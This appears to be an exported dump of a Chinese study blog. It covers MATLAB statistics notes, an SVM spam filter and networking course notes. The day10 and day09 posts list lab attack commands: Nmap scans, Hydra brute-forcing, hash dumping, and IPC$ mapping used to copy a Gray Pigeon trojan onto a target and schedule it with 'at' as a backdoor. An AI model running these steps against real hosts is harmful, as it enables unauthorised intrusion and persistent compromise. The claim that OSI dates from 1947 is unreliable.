无监督\n\n```matlab\nx=[\n...  ...\n...  ... ];\n\nx2=zscore(x);                   %标准化\ny2=pdist(x2,'euclidean');       %采用欧氏距离\nz2=linkage(y2, 'ward');         %采用内平方距离法\n% z2=linkage(y2, 'complete');    %采用最长距离法\nh=dendrogram(z2);               %生成只有顶部n个节点的冰柱图（谱系图）\n```\n\n## 判别分析\n\n> 可简单理解为 有监督\n\n```matlab\ntrain=[\n... ... ... ...\n... ... ... ...\n... ... ... ...];\ngroup=[... ...]';\nsample=[\n... ... ... ...\n... ... ... ...];\n[class,err]=classify(sample,training,group,'linear')        %线性判别法分类\n[class,err]=classify(sample,training,group,'mahalanobis')   %使用马氏距离判别法分类\n[class,err]=classify(sample,training,group,'quadratic')     %使用二次判别法分类\n```\n\n**输入：**\n\n- train和sample矩阵分别为 训练样本数据 和 预测样本数据\n- group为 train中每行数据的类别\n\n**输出：**\n\n- class：输出样本数据的类别\n- err：出错概率\n\n## 主成分分析\n\n> 用于选取变量，并做模型分析\n\n```matlab\n%9.7节 考试成绩原始程序\n\n[CJ,textdata]=xlsread('数据文件9-4 学生考试成绩.xlsx',1); %读取Excel数据\nX=CJ(:,1:end);    %读取成绩数据\nM=mean(X);        %计算均值向量\nCo=cov(X);        %计算协方差矩阵\nr=corrcoef(X);    %计算相关系数矩阵\n[COEFF,SCORE,latent,tsquare]=pca(X)    %主成分分析\npercent_explained = 100*latent/sum(latent)  %计算主成分解释比例\n\n%%\nfigure(2);\npareto(percent_explained)     %画图2\nxlabel('主成分')\nylabel('方差解释 (%)')\n%%\nresult(1,:)={'特征值','贡献率','累积贡献率'};\nresult(2:7,1)=num2cell(latent)\nresult(2:7,2:3)=num2cell([percent_explained,cumsum(percent_explained)])%输出表2\n%%\nstnum=textdata(2:end,1); %提取学生编号\nsumX=sum(X,2);           %计算总分\nresult1=cell(53,4);\nresult1(1,:)={'学生序号','总分','第一主成分得分y1','第二主成分得分y2'};\nresult1(2:end,1)=stnum;\nresult1(2:end,2:end)=num2cell([sumX,SCORE(:,1:2)]) %输出表3\n%%\nfigure(3); %前2个主成分的得分散点图3\nplot(SCORE(:,1),SCORE(:,2),'ko');\nxlabel('第一主成分');\nylabel('第二主成分');\ngname(stnum)   %交互式标注学生序号\n```\n\n- 主要代码就前7行，根据主成分解释比例percent_explained的帕累托图选取主成分，得分在score矩阵中\n- gname可交互式标注序号\n\n因子分析：（可以不用）\n\n```matlab\n%%\n[v,e]=eig(r)   % 相关系数矩阵的特征向量与特征根e\n[lambda,psi,T,stats,F] = factoran(X,2)  %因子分析m=2\n%%\nresult0=num2cell([lambda,psi])\nhead={'变量','因子f1','因子f2','特殊方差'};\nvarname={'数学分析','高等代数','概率论','微分几何','抽象代数','数值分析'}' ;\nresult2=[head;varname,result0]   %输出表4\n%%\nresult3=cell(53,4);\nresult3(1,:)={'学生序号','总分','因子f1得分','因子f2得分'};\nresult3(2:end,1)=stnum;\nresult3(2:end,2:end)=num2cell([sumX,F(:,1:2)])  %输出表5\n%%\nfigure(4);%画因子得分散点图4\nplot(F(:,1),F(:,2),'ro');\nxlabel('基础课因子得分');\nylabel('开闭卷因子得分');\ngname(stnum)   %交互式标注学生序号\nFy=(3.7099*F(:,1)+1.2604*F(:,2))/4.9703  %计算表6中因子综合得分\n```\n\n---\n\n> 9.5 时间序列分析\n\n确定性趋势求解就是回归，自己确定函数形式，然后回归\n\n随机性趋势用的不多，详见P258\n\n---\n\n# 模糊综合评价\n\n## 权重确定方法\n\n层次分析法\n\n- 主要还是对已有数据的分析，如P276中例子所述，需要先给出各个因素的判别矩阵\n\n德尔菲法\n\n变异系数法\n\n均方差法\n\n参考性不大，主要是理解思想\n\n## 模糊综合评价方法\n\n基本上用不着编程，需要已知权重","tags":["数学建模"],"categories":["数学建模"]},{"title":"Spam-Classification","url":"/2021/06/25/SVM-Spam-Classification/","content":"> 通过组员对题目和实验第一部分详细的讲解，我们对支持向量机是如何工作的以及如何使用支持向量机中的高斯核有了一个直观的认识，在第二部分中，我们要使用支持向量机解决一个实际的问题，垃圾邮件过滤，我们使用支持向量机构建垃圾邮件过滤器，也就是用数据训练一个分类器以分类电子邮件是否是垃圾邮件，垃圾邮件分类结果为1，非垃圾邮件分类结果为0\n\n<!-- more -->\n\n---\n\n其中邮件数据集来源于阿帕奇的[SpamAssassin公共语料库](http://spamassassin.apache.org/old/publiccorpus/)\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(1).png)\n\n---\n\n本实验主要分为以下几个部分\n\n# 邮件处理\n\n在开始编程之前，我们首先需要建立模型。\n\n+ 对于垃圾邮件和正常邮件，应该怎样区分呢，通常来说，垃圾邮件中大概率会出现网址、数字、金额等信息，这是有别于正常邮件的地方，很自然的我们会想把这些信息作为特征提取出来，以便更好的实现邮件过滤。\n\n+ 那么下一步要做的就是考虑这些特征如何提取了，或许很多邮件中都会包含类似的数据，但是几乎每一封电子邮件中都是不同的。因此我们的思路是把这些数据简单的进行分类。打个比方，遇到一封邮件，如果出现了网址信息，我们并不关心他给出的网址是什么，我们知道在这一封邮件中出现了URL，那么根据经验，这封邮件是垃圾邮件的可能就比较大。\n  + 这样做的效果是让垃圾分类器根据是否存在任何URL而不是某个特定的URL来做出分类决策，以提高垃圾邮件分类器的性能。\n\n那么具体如何实现呢，我们的思路是将这些值规范化，以便将各种各样的网址都视为相同的，所有的数字也视为相同的。\n\n处理主要分为预处理和标准化两部分\n\n> 我们之前说的将这些值规范化在预处理中进行，第二步的标准化的意思就是把预处理后的邮件文本信息和一个数组建立映射关系，其实说成字典会更好理解以下，用单词在字典中的位置作为特征值提取出来\n\n## 预处理\n\n```matlab\nemail_contents = lower(email_contents);\nemail_contents = regexprep(email_contents, '<[^<>]+>', ' ');\nemail_contents = regexprep(email_contents, '[0-9]+', 'number');\nemail_contents = regexprep(email_contents, '(http|https)://[^\\s]*', 'httpaddr');\nemail_contents = regexprep(email_contents, '[^\\s]+@[^\\s]+', 'emailaddr');\nemail_contents = regexprep(email_contents, '[$]+', 'dollar');\n```\n\n- 邮件字母小写化，将整个电子邮件转换成小写，忽略大写的好处是能够更好的分辨单词\n- 除去HTML标签，将所有HTML标签将从电子邮件中删除。许多电子邮件通常带有HTML格式，这些标签数据对我们的分类并没有帮助\n- 规范化邮件地址，将所有的邮件地址替换为 emailaddr\n- 规范化数字，将所有数字替换为 number\n- 规范化金额，以美元$为例，将所有金额替换为 dollar\n- 删除非单词符号和标点符号\n- 单词词根化，就是把每个单词简化为词根形式，比如include、includes、included，都用include替换\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(2).png)\n\n---\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(3).png)\n\n---\n\n## 标准化\n\n在对电子邮件进行预处理之后，我们对其进行标准化，把每封电子邮件转换成一个单词索引矩阵，在这个过程中，我们选择了最经常出现的单词作为我们考虑的词汇表，实验所给的词汇表有1899个单词。\n\n> 至于为什么不把出现次数比较少的单词纳入字典中，这不仅仅是他们的加入对模型的帮助不大，在训练的过程中，出现次数少的单词只出现在少数的电子邮件中，他们可能会导致模型过拟合我们的数据集。\n\n那么接下来我们要做的就是逐单词遍历预处理后的邮件内容，与我们字典中的数据进行对比，找到就记录到word_indices[]矩阵中\n\n```matlab\nfor i = 1:length(vocabList)\n    if(strcmp(vocabList(i), str))\n        word_indices = [word_indices; i];\n        break;\n    end\nend\n```\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(4).png)\n\n---\n\n# 特征提取\n\n经过邮件处理，我们已经把一封邮件转换成了单词索引矩阵的形式，接下来进行特征的提取，在此过程中，我们把字典中给出的这些出现频次较高的数据全都视为特征，也就是说一封邮件的特征有1899个，若第i个单词出现了，那么第i个特征的特征值为1，否则为0\n\n```matlab\nfor i = 1:length(word_indices)\n    x(word_indices(i)) = 1\nend\n```\n\n# 训练SVM\n\n了解了如何提取出一封邮件的特征后，接下来要开始训练支持向量机。在此训练的数据是实验提供的，其中spamTrain.mat提供了4000封邮件的特征及其类型，spamTest.mat中提供了1000封邮件的特征。\n\n+ 训练结束后在训练集上做验证，得到了99.85%的正确率\n\n+ 然后在测试集上做验证，得到了98.9%的正确率\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(5).png)\n\n# 最佳预测词\n\n为了更好的理解垃圾邮件分类器的工作原理，我们可以检查参数，看看分类器认为哪些单词是最能判定一封邮件是垃圾邮件的。\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(6).png)\n\n---\n\n# 选做-测试自己的邮件\n\n现在我们已经训练了一个垃圾邮件分类器，分类效果到底好不好，还是得自己试试看才知道发( •̀ ω •́ )✧\n\n先试试从coursera收到的关于这门课程的邮件\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(7).png)\n\n---\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(8).png)\n\n结果是0，不是垃圾邮件 (没有打脸，Nice)\n\n---\n\n再试试网飞的推销订阅邮件(毫无疑问是垃圾邮件)\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(9).png)\n\n---\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202106(10).png)\n\n结果为1，是垃圾邮件 (Nice!!!)\n\n","tags":["机器学习"],"categories":["机器学习"]},{"title":"day11 - OSI与TCP-IP 5层协议 | 物理层","url":"/2020/08/11/day11-OSI-TCP-IP-5/","content":"\n# 一、OSI与TCP-IP 5层协议\n\n## 分层模型\n\n### 分层思想\n\n- 将复杂的流程分解为几个功能相对单一的子过程\n    - 整个流程更加清晰，**复杂问题简单化**\n    - 更容易发现问题并针对性地解决问题\n    - 同层使用相同协议，下层为上层提供服务\n    \n- 使用网络的未必知道数据的传输过程\n\n    <!-- more -->\n\n---\n\n### OSI七层模型\n\n- OSI（Open System interconnection）\n是开放的通信系统互联参考模型\n- 历史：1947 年，ISO 组织发布了 OSI 参考模型\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day11(0).png)\n\n   —OSI 七层模型—\n\n- TCP/IP 5层协议簇/协议栈：会话层，表示层，应用层三层合并成为应用层，最后为五层协议\n- 这两个同时诞生，OSI 先有模型，TCP 先有协议\n- 四层模型：把 数据链路层 和 物理层 合并为网络接口层\n- 特点：上层对下层兼容，处于上层的设备一定可以识别所有下层的信息\n\n---\n\n### OSI模型 vs TCP/IP模型\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day11(1).png)\n\n---\n\n## 数据传输过程\n\n### 数据封装过程\n\n假设要发送“Hello”这个数据，首先是封包\n\n1.通过应用层，在软件中生成，进入传输层\n\n2.传输层对数据进行 封装 ，进入网络层\n\n- 传输层 完成进程与进程之间的通信\n- 封装：给数据加上 TCP/UDP 头\n在加头之前判断数据是从应用层中的哪个软件生成的\n然后在数据中加上原端口号和*目标端口号*(服务器端口号)\n- 封装完后整个数据为 **数据段**\n- 端口号是应用层的\nUDP：速度快，但安全性不高，不可靠传输(双方不建立连接)，像写信\nTCP ：速度不快，但安全性高，可靠传输(双方要建立连接)，像打电话\n\n3.网络层对数据再加上 IP包头 ，进入数据链路层\n\n- 网络层 完成点到点的通信   (行话，\"点\"指电脑)\n- 加上 IP 包头(包含源IP和目标IP)，加上后整个数据为 **IP包/报文**\n\n4.数据链路层（网卡）给数据加上 MAC子层 和 FCS ，进入物理层（网线）\n\n- 交换机工作在 数据链路层，意味着交换机没有上层的功能\n- MAC子层：简称帧头，源 MAC 地址和目标 MAC 地址\nFCS：帧校验序列，简称帧尾，4个字节，循环校验算法 CRC（类似hash）中的值，加上后整个数据为 **帧**\n\n5.物理层(网线) 将 帧 用数字信号(**比特流**)传输出去，经过交换机、路由器、服务器、防火墙等一系列设备到达 对方电脑网卡\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day11(2).png)\n\n---\n\n### 数据解封装过程\n\n6.数据链路层（网卡）检查 帧 的 MAC子层 和 FCS，检查MAC子层的目标MAC地址 与 该网卡的地址 是否吻合，吻合则解封装，不吻合就扔掉\n\n7.网络层接着校验IP包/报文，检查目标IP是不是本机，是则解包，不是就扔掉\n\n8.传输层对数据段解析，由TCP/UDP头里的目标端口号 将信息传给应用层的正确进程\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day11(3).png)\n\n---\n\n### 要点总结\n\n- 各层的 数据名称 及 对应设备：\n    1. 数据/PDU                        应用层           PC/防火墙    五层\n    2. 数据段/段     Fragment   传输层            防火墙         四层\n    3. 报文/包/IP包 packet        网络层            路由器         三层\n    4. 帧                  Franme       数据链路层    交换机 网卡 二层\n    5. 比特               bit              物理层            网线             一层\n        - 8 bit = 1 Byte字节\n        - 所谓的百兆宽带 (* ￣︿￣)，单位是b，100Mb/s=12.5MB/s ，而且一般还达不到......\n- 各层相关协议\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day11(4).png)\n\n- DNS补充：客户机与服务器之间用 UDP，服务器与服务器之间用 TCP\n\n# 二、物理层\n\n1. 传输媒介：网线 / 光纤 / 空气\n\n2. 信号：模拟信号（用放大器处理，不可复原）\n           数字信号（用中继器处理，抗干扰能力强，可复原，可传输距离短）\n\n    光信号：\n\n    光线类型:  \n    \n    1)单模光纤 一般线是黄色\n       2)多模光纤 一般线是橙色/蓝色\n    \n3. 网线 / 双绞线：(双绞，抗干扰，电磁场抵消)\n    - 5类双绞线\n    - 超5类双绞线\n    - 6类 7类 chegn\n    - 跳线：比较短的网线，1-3米长\n    \n4. 制作标准：（面向水晶头铜色拨片，颜色线顺序，加粗不变）\n\n    T568A：白绿、绿、白橙、**蓝、白、**橙、**白棕、棕**\n\n    T568B：白橙、橙、白绿、**蓝、白、**绿、**白棕、棕**\n\n5. 网线的用途分类： 具有三层功能以上的设备为同种设备\n    - 交叉线：一端为 A(发送)，一端为 B(接收)。同种设备间使用！\n    如路由器 ↔ 路由器，路由器 ↔ 电脑\n    - 直通线：两端都是 A 或 B，目前行业所见都是B线。异种设备间使用！如交换机 ↔ 电脑。\n    - 全反线：一端为 A，另一端为反 A，也称 console 线，用于配置企业路由器/交换机\n    \n6. 关于交换机的接口：\n\n    Ethernet                    10Mb/s           简写:   E\n    FastEthernet\t          100Mb/s                    F\n    GigabitEthernet\t  1000Mb/s                  G\n    TenGigabitEthernet\t  10000Mb/s                TG\n\n    例如 Ethernet0/3 中，0 是模块编号，3 是该模块的接口编号\n\n7. 家里一般用的”路由器“其实是交换机和路由器的杂交产品，真正的名字是”三层交换机“","tags":["网络安全"],"categories":["网络安全"]},{"title":"day10 - 扫描与爆破","url":"/2020/08/10/day10-Scanning&blasting/","content":"\n# 一、扫描技术\n\n## 1.扫描概述\n\n- 人工与工具的结合\n\n- 主机探测：确定目标主机是否存活\n\n- 端口扫描：寻找在线主机所开放的端口，并且在端口上所运行的服务。甚至可以进一步确定目标主机操作系统的类型和更详细的信息\n\n  <!-- more -->\n\n## 2.基础知识\n\n- 常见端口号\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day10(0).png)\n\n## 3.Nmap扫描器\n\n- 重要常用参数\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day10(1).png)\n\n- 常见用法\n\nNmap **-sP** 10.1.1.1**/24**                     #扫描10.1.1.0 整个网段\nNmap -p   **21,23-25,3389** 10.1.1.1  #扫描 指定IP的 指定端口\nNmap -p   21,23 10.1.1.1 **-sV**          # 扫描21，23的服务版本\nNmap **-A**   10.1.1.1                          #全面扫描\nNmap **-O**   10.1.1.1                          #扫描目标系统版本(win,linux)\nNmap -p    21,23 10.1.1.1 **-oN d:\\result.txt**  #生成一个结果文档\n\n# 二、爆破\n\n## 1.Hydra 九头蛇 远程爆破工具\n\n- Hydra -l 用户名 -p 密码 IP 端口服务名称\n    - 直接输账号密码（小写是已知项，大写是打开文件）\n- Hydra -L 用户名字典 -P 密码字典 IP 端口服务名称\n    - 不知道账号密码，用字典暴力破解\n\nHydra.exe -l a -p 123 10.1.1.1 telnet\n\nHydra.exe -l a **-P**  d:\\password.txt  10.1.1.1  ftp\nHydra.exe -l a **-P**  d:\\password.txt  10.1.1.1  mysql\n\nHydra.exe **-L** d:\\user.txt **-P**  d:\\password.txt  10.1.1.1  mysql\n\n## 2.本地爆破\n\n- get pass 漏洞：系统登陆后会把密码保存在内存中 (win10 已经修复)\n\n    过程：用 cmd 运行 getpass.exe 即可\n\n    - 操作方法：在目标电脑上插上U盘，提前写个批处理，执行getpass.exe，将结果保存为txt，拔出就有密码了\n- 5 次 shift 粘滞键漏洞\n- 用 pwdump 获取登陆 hash 然后解密\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day10(2).png)\n\n    手工将hash值存储到hash.txt中\n\n    使用saminside软件进行暴力破解\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day10(3).png)\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"day09 - 简单渗透测试","url":"/2020/08/09/day09-Simple-penetration-test/","content":"\n# 一、简单渗透测试思路\n\n## 0.授权（别人让你攻击）\n\n## 1.信息收集\n\n- nslookup 域名 查IP\n\n- nslookup whois 查子域名\n\n  <!-- more -->\n\n## 2.扫描漏洞\n\n- nmap（扫描软件） scanport（端口扫描）\n\n    且利用 telnet 命令也可以探测：telnet IP 端口号，若标题变成 telnet 则说明开放\n\n- 首先基础扫描 IP 范围 端口\n- 然后再根据端口深入扫描 （IIS，apache，什么网站）\n- 高级扫描：\n\n    扫描容器漏洞：如 IIS 漏洞 2003-IIS6.0 或 2008-IIS7.0 版本的\n\n    扫描网站漏洞（SQL 等）\n\n## 3.漏洞利用\n\n## 4.提权（shell环境、桌面环境 、最高权限）\n\n## 4.5.做该做的事情...\n\n## 5.毁尸灭迹\n\n## 6.留后门\n\n## 7.渗透测试报告（正规）\n\n---\n\n# 二、简单渗透测试过程\n\n- 手工测试端口号开放：telnet IP地址 测试端口\n- 自动测试端口号开放：scanport小工具\n- **445漏洞之 IPC$**\n\n    ```bash\n    net use f: \\\\10.1.1.2\\share 密码 /user:用户 == 把分享文件映射到自己电脑\n    net use f: /del        删除共享映射\n    net use * /del         删除所有共享映射\n    net use f: \\\\10.1.1.2\\c$   密码 /user:用户     进入C盘\n    net use \\\\10.1.1.2\\IPC$ 密码 /user:用户     == IPC漏洞\n    ```\n\n- **暴力破解系统密码之445**\n    - 软件：ntscan1.0 (只能针对445弹框做暴力破解)     //也可用 hydra\n    - 用字典编写软件编写个字典\n- **创建后门**\n    - 用灰鸽子制作木马\n    - copy 植入木马\n    - net time \\\\10.1.1.2 查看目标当前时间\n    - at \\\\10.1.1.2 11:30 “c:\\windows\\system32\\heihei.exe” 创建一个计划任务，在11:30时运行exe文件\n\n    简单流程\n    1.scanport扫描445端口\n    2.进行暴力破解：NTscan\n    3.网络映射：net  use  \\\\10.1.1.2\\ipc$  密码  /user:用户\n    4.制作木马—灰鸽子\n    5.植入木马—留后门\n    6.copy  d:\\haha.exe  \\\\10.1.1.2\\c$\n    7.设置计划任务 自动执行木马：\n            net  time  \\\\10.1.1.2\n            at  \\\\10.1.1.2 11:30  \"c:\\haha.exe\"\n    8.等待肉鸡上线","tags":["网络安全"],"categories":["网络安全"]},{"title":"day08 - PKI","url":"/2020/08/08/day08-PKI/","content":"\n# 1.PKI概述\n\n- 名称：Public Key Infrastructure 公钥基础设施\n\n- 作用：通过加密技术和数字签名保证信息的安全\n\n- 组成：公钥加密技术、数字证书、CA、RA\n\n  <!-- more -->\n\n# 2.信息安全三要素\n\n- 机密性\n\n- 完整性\n- 身份验证/操作的不可否认性\n\n# 3.哪些IT领域用到PKI\n\n- SSL/HTTPS\n- IPsecVPN\n- 部分远程访问VPN\n\n# 4.公钥加密技术\n\n- 作用：实现对信息加密、数字签名等安全保障\n- 加密算法：\n    1. 对称加密算法   （DES，3DES，AES）\n        - 加解密的密钥一致\n    2. 非对称加密算法（RSA，DH）\n        - 通信双方各自产生一对公私钥\n        - 双方各自交换公钥\n        - 公钥和私钥互为加解密关系！\n        - 公私钥不可互相逆推！\n    3. HASH 算法：MD5 SHA（不可逆，验证完整性）\n        - HASH值 == 摘要\n\n# 5、数字签名\n\n- 用 **自己的私钥** 对 **摘要** 加密得出的密文就是 数字签名\n\n# 6、证书\n\n- CA是权威证书颁发机构\n\n- 证书用于保证**公钥**的合法性\n\n- 证书格式遵循 X.509 标准\n- 数字证书保护信息：\n\n    使用者的公钥值\n\n    使用者标识信息（如名称和电子邮件地址）\n\n    有效期（证书的有效时间）\n\n    颁发者标识信息\n\n    颁发者的数字签名\n\n- 数字证书由公正权威的第三方机构即 CA 签发\n\n# HTTPS通信过程\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day08.png)\n\n# PKI实验\n\n实验步骤;\n\n1. 配置服务器IP地址10.1.1.2 /24\n2. 安装IIS服务，并建立站点。\n\n    在客户机上验证访问 http://www.flower.com\n\n3. 安装CA组件\n4. 打开IIS，先生成证书申请文件\n5. 向CA申请证书：\n\n    打开网页：http://10.1.1.2/certsrv 并向CA发送web服务器申请文件\n\n6. CA颁发证书\n7. 在web服务器上下载并完成安装\n8. 在web服务器上启用SSL443\n9. 在客户端上验证","tags":["网络安全"],"categories":["网络安全"]},{"title":"day07 - 域","url":"/2020/08/07/day07-domain/","content":"\n# 1、 域的概述\n\n- Domain 域\n\n- 内网环境：\n    1. 工作组：默认模式，人人平等，不方便管理\n    2. 域       ：人人不平等，集中管理，统一管理\n    \n- 域的特点：\n\n    **集中管理/统一管理**\n    \n    <!-- more -->\n\n# 2、域的组成\n\n- 域控制器：DC（Domain Controller）\n- 成员机\n\n# 3、域的部署\n\n- 安装域控制器--就生成了域环境\n- 安装活动目录--就生成了域控制器\n- 活动目录：Active Directory == AD（DC的**核心**）\n\n# 4、活动目录\n\n- AD\n- 特点：集中管理/统一管理\n\n# 5、部署安装活动目录：\n\n1. 开启2008虚拟机，并桥接到一个VMnet里\n2. 配置静态 IP 地址 10.1.1.1 /24 (指子网掩码24位，即255.255.255.0)\n3. 开始--运行--输入 dcpromo，安装活动目录\n\n    弹出向导：\n\n    勾选DNS  --  新林中新建域  --  域的FQDN（onepiece.com）--  设置林功能级别和域功能级别，可都为2003  --  设置目录还原密码(666.com)  --    勾选安装后重启\n\n4. 在DC登录域  ONEPIECE/administrator，DC的本地管理员自动升级为域管理员，\n5. 检验AD是否安装成功：\n    1. 计算机右键属性  -  查看所属域\n    2. DNS服务器中是否自动创建onepiece.com区域文件\n    及自动注册DC的域名解析记录\n    3. 开始 -- 管理工具 -- AD用户和计算机\n\n         computer：普通域成员机列表\n\n         Domain Controller：DC列表\n\n         users：域账号\n\n# 6、PC加入域\n\n1. 配置IP，并指DNS，且要把ipv6去勾\n2. 计算机右键属性--更改--加入onepiece.com域\n    - DC发来验证，需要有权限加入域的账号密码\n    若用域管理员登录，用户名为administrator,若识别出域，直接写用户名,  若没有则用户名写  onepiece.com\\administrator\n3. 重启加入域后，成功使用域用户登录成员机\n    - 通常用户名例如：路飞 —> fei.lu\n\n常见的小问题\n1）加入域不成功\n    网络是不是不通，IP有没有配好 \n    解析是否成功解析，nslookup 域名\n    是否为DNS缓存问题，ipconfig  /flushdns\n2）登入域不成功\n     如XP，已勾选登录域onepiece，不用再写onepiece.com\\fei.lu\n3）域用户的权限 \n     建议将域用户加入到普通成员机的本地管理员组中\n\n×××本地管理员组：administrators\n×××域管理员组    ：Domain Admins\n\n# 7、组织单位 OU\n\n- 组织单位：OU，Organizational Unit\n- 作用：用于归类域资源（域用户、域计算机、域组）下发组策略\n- 创建：在域管理中右键新建\n\n# 8、组策略 GPO\n\n- GPO：Group Policy\n- 作用：通过组策略可以修改计算机各种属性，如开始菜单、桌面背景、网络参数\n- 组策略在域中，是基于OU下发的\n- 在域中，组策略的应用顺序是 LSDOU\n  LSDOU（策略优先级）Local Site Domain Organizational Unit\n  应用过程中，如果出现冲突，后应用的生效\n\n    ===LSDOU顺序\n    上级OU： 桌面：aa              |        运行：删除\n    下级OU： 桌面：未配置       |        运行：不删除\n\n    =正常情况下：\n    结果     ： 桌面：aa               |       运行：不删除\n\n    =下级OU设置了阻止继承：(只看自己OU的组策略)\n    结果     ：  桌面：未配置       |       运行：不删除\n\n    =上级设置了强制：             (下级组策略只看强制的组策略)\n    结果     ：  桌面：aa              |        运行：删除\n\n    注意：当上级强制和下级阻止继承同时设置，强制生效","tags":["网络安全"],"categories":["网络安全"]},{"title":"day06 - IIS - WEB服务器 | FTP服务器","url":"/2020/08/06/day06-IIS-WEB-FTP/","content":"\n\n# 一、WEB服务器\n\n## 1、WEB服务器概述\n\n- WEB服务器也称为网页服务器，HTTP服务器，WWW万维网服务器等\n\n- 使用协议是HTTP或HTTPS协议    (浏览器专业名称其实是HTTP客户端)\n\n  <!-- more -->\n\n## 2、WEB服务器端口号\n\n- HTTP  : TCP 80\n- HTTPS: TCP 443\n\n## 3、WEB服务器发布软件：\n\n- 微软：IIS（Internet Information Services互联网信息服务)\n(可以发布web网站和FTP站点）\n- linux：Apache /LAMP /Tomcat /nginx 等等\n- 第三方软件：phpstudy、XAMPP      (基于LAMP，仅限学习测试使用)\n\n## 4、部署WEB服务器\n\n1. 配置静态 IP 地址\n2. 安装 IIS-WEB 插件（此时80端口已经打开）\n3. 停用默认站点       （当一个站点都没有时，端口自动关闭）\n4. 新建网站--设置IP地址和端口--指定站点路径--设置权限\n5. 设置默认文档（即设置首页）\n\n## 5、一台服务器同时发布多个WEB站点\n\n- 不同的 IP，相同的端口\n- 相同的 IP，不同的端口（不建议使用1000以下的端口）\n- 相同的 IP，相同的端口，不同的域名（主机头）\n\n    1. 在IIS中新建网站，在IP地址和端口设置时，配置本机IP ，设置主机头为相应域名www.onepiece.com\n    2. 导入网页文件所在文件夹 D:\\onepiece，允许匿名访问，网站新建完成\n    3. 右键属性，在文档选项中，默认文档添加index.html，移至最前\n       此时可以通过 IP 访问网站\n       4.配好DNS服务器，新建区域 onepiece.com，新建主机名称为www\n       此时就可以通过 www.onepiece.com 来访问该网站了\n\n## 6、网站类型\n\n- 静态网站：一般扩展名为 .html 或 htm，无后台数据库（可不是不会动！）\n- 动态网站：一般扩展名为 .asp 或 .php，有后台数据库，asp 或 php 可以连接前台页面与后台数据库\n\n    *默认 IIS 禁用动态网站，需要在WEB服务扩展里打开 Active Server Pages 服务\n\n- 本质区别：动态网站能与用户进行交互（登陆），而静态网站不能\n\n# 二、FTP服务器\n\n## 1、FTP服务器概述\n\n- File Transfer Protocol                 文件传输协议\n\n## 2、FTP端口号\n\n- TCP      20/21\n\n## 3、FTP工作模式\n\n- 主动模式（ PORT ）：服务器主动从 20 端口向客户机传输数据\n- 被动模式（ PASV ）：客户机向服务器发出传输请求，然后服务器从随机生成的端口向客户机传输数据\n\n主被动模式阐述的是数据传输过程\n主被动模式选择权在客户机\n主被动是站在服务器角度来说的\n（主动模式：客户机想让服务器主动）\n\n- 端口的区别：\n\n    20端口：数据传输端口（传输文件的）\n\n    21端口：命令控制端口（传输指令的，比如客户机想要登陆 FTP 就要发送到服务器的 21 端口上）\n\n- FTP传输简要原理/过程：\n    1. 客户机随机开一个端口 50001，向服务器端口 21 发送连接请求，然后进行用户登录\n    2. 当客户机向服务器发送了下载文件的请求时，根据工作模式分为两种情况：\n        - 主动模式：\n\n            客户机随机开一个端口 50002，同时服务器开启 20 端口，并从 20 端口向客户机主动传输文件\n\n            - 若客户机开着防火墙，则服务器无法访问50002端口，那么主动模式没用，只能是被动模式\n        - 被动模式：\n\n            客户机随机开一个端口 50002，同时服务器在本地随机开放一个端口 20001，之后客户机主动向服务器发送传输请求，接到请求之后服务器再开始传输文件（即回包）\n\n            - 若服务器开着防火墙，则客户机无法访问20001端口，那么被动模式没用，只能是主动模式\n- 关于客户机连接异常的解决方法：关闭防火墙，把主被动模式都试一下\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day06.png)\n\n## 4、部署FTP服务器\n\n1. 配置静态 IP\n2. 安装 IIS - ftp软件（此时21端口已经打开）\n3. 使用默认站点或者创建新的站点（当一个站点都没有时，端口自动关闭）\n\n    *注意：用户最终权限为 FTP 权限与 NTFS 权限取交集，与共享权限类似\n\n    **建议：FTP 权限全打勾，在 NTFS 设置具体权限\n\n4. 禁止匿名访问\n- 访问方式：ftp://10.1.1.1 ，输入账号密码","tags":["网络安全"],"categories":["网络安全"]},{"title":"day05 - DHCP部署与安全","url":"/2020/08/05/day05-DHCP/","content":"\n# 1、DHCP作用\n\n- DHCP（ Dynamic Host Configure Protocol，动态主机配置协议）\n\n- 自动分配 IP 地址\n\n  <!-- more -->\n\n# 2、DHCP相关概念\n\n- 地址池/作用域：（IP、DNS、子网掩码、网关、租期）\n- DHCP协议端口是UDP 67/68\n\n# 3、DHCP优点\n\n- 减少工作量\n- 避免IP冲突\n- 提高地址利用率\n\n---\n\n# 4、DHCP原理\n\n- 也称为 DHCP 租约过程，分为四个步骤：\n    - **客户机发送 DHCP Discovery 广播包**\n\n         客户机广播请求 IP 地址（包含客户机的 MAC 地址，即物理地址）\n\n    - **服务器响应 DHCP Offer 广播包**\n\n         服务器响应提供的 IP 地址（但无子网掩码、网关等参数）\n\n    - **客户机发送 DHCP Request广播包**\n\n         客户机选择 IP（也可认为确认使用哪个 IP）\n\n    - 